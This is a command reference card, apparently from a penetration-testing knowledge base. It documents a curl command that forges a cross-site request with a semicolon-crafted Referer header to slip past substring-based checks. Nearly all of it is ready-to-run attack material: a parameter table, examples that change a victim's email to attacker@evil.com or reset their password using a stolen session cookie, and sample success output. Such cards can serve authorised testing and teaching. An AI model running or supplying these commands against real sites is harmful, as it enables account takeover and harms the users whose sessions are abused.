---
type: command
executor: bash
data: >-
  curl -X POST -H "Referer: $_ATTACKER_URL;$_TRUSTED_URL" -H "Cookie:
  $_VICTIM_COOKIE" -d "$_POST_DATA" $_TARGET_URL
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
  - macOS
  - Windows
tags:
  - csrf
  - http-request
  - bypass
verified: true
validated: true
---

# Curl CSRF Request with Semicolon Referer

## Command

```bash
curl -X POST -H "Referer: $_ATTACKER_URL;$_TRUSTED_URL" -H "Cookie: $_VICTIM_COOKIE" -d "$_POST_DATA" $_TARGET_URL
```

## Description

This command uses curl to simulate a CSRF request to a target endpoint, setting a crafted Referer header with a semicolon to bypass substring-based validation. It mimics the browser's POST from the attacker's page, including the victim's session cookie for authentication.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_ATTACKER_URL | Attacker's page URL (e.g., https://attacker.com/csrf.html) | Yes |
| $_TRUSTED_URL | Target's domain prefixed with protocol (e.g., https://trusted.domain.com) | Yes |
| $_VICTIM_COOKIE | Victim's session cookie (e.g., sessionid=abc123) | Yes |
| $_POST_DATA | Form data for the action (e.g., new_email=attacker@evil.com) | Yes |
| $_TARGET_URL | Vulnerable endpoint URL (e.g., https://trusted.domain.com/change-email) | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -H "Referer: https://attacker.com/csrf.html;https://trusted.domain.com" -H "Cookie: sessionid=abc123" -d "new_email=attacker@evil.com" https://trusted.domain.com/change-email
```

### Advanced Usage

```bash
curl -X POST -H "Referer: https://attacker.com/csrf.html;https://trusted.domain.com" -H "Cookie: sessionid=abc123;csrftoken=xyz" -d "password=secret&confirm=secret" -v https://trusted.domain.com/change-password
```

## Expected Output

* Connected to trusted.domain.com (93.184.216.34) port 443
> POST /change-email HTTP/1.1
> Referer: https://attacker.com/csrf.html;https://trusted.domain.com
> Cookie: sessionid=abc123
> Content-Type: application/x-www-form-urlencoded
> 
< HTTP/1.1 200 OK
< Set-Cookie: sessionid=abc123; Path=/
{"status": "success", "message": "Email updated"}

A successful response (e.g., 200 OK) indicates the action was performed without Referer rejection.

## Related

- [[procedures/perform-csrf-attack-with-semicolon-referer-bypass]]
